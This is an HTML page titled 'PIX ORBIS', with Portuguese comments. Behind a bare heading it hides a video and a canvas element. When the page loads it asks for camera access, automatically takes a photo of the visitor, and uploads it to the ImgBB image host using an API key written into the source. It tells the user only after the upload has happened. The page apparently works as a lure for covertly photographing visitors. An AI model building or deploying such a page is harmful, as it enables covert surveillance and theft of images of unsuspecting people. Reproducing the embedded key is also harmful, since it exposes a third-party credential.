<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PIX ORBIS</title>
</head>
<body>
    <h1>PIX ORBIS</h1>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>
    <p id="link"></p>
    <script>
        // Configuração do ImgBB
        const apiKey = 'b6147e113acc9c24966a9c0f888f0242'; // Sua API Key

        // Acessar a câmera
        const video = document.getElementById('video');
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;

                // Esperar a câmera estar pronta
                video.addEventListener('loadeddata', () => {
                    // Capturar imagem automaticamente
                    captureAndUpload();
                });
            })
            .catch(err => {
                console.error('Erro ao acessar câmera:', err);
                alert('Erro ao acessar a câmera. Por favor, conceda permissão para continuar.');
            });

        // Função para capturar imagem e enviar ao ImgBB
        function captureAndUpload() {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Converter imagem em Base64
            const imageData = canvas.toDataURL('image/png');
            console.log('Imagem capturada automaticamente.');

            // Enviar imagem ao ImgBB
            const formData = new FormData();
            formData.append('key', apiKey);
            formData.append('image', imageData.split(',')[1]); // Remove "data:image/png;base64,"

            fetch('https://api.imgbb.com/1/upload', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(result => {
                console.log('Imagem enviada:', result.data.url);
                const link = document.getElementById('link');
                link.innerHTML = `<a href="${result.data.url}" target="_blank">Ver Imagem</a>`;
                alert('Imagem capturada e enviada com sucesso!');
            })
            .catch(error => {
                console.error('Erro ao enviar imagem:', error);
                alert('Erro ao enviar imagem. Verifique a API Key ou conexão.');
            });
        }
    </script>
</body>
</html>
